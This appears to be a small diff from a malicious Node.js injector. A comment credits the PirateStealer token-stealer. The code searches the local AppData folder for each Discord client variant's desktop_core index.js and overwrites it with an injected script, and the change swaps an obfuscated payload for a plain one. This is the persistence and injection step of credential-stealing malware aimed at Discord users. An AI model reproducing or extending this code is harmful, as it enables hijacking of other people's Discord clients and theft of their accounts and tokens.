@@ -8,7 +8,7 @@ var HelloWorld = [ "Discord", "DiscordPTB", "DiscordCanary", "DiscordDevelopment
 
     HelloWorld.forEach(function(folderName) { //https://github.com/Stanley-GF/PirateStealer/blob/main/src/injector/index-win.js#L38-L43
         glob.sync(`${process.env.LOCALAPPDATA}\\${folderName}\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js`).map(file => {
-            fs.writeFile(`${file}`, obfuscationResult, err => {
+            fs.writeFile(`${file}`, script, err => {
                 if (err){
                     console.error(err);
                     return;
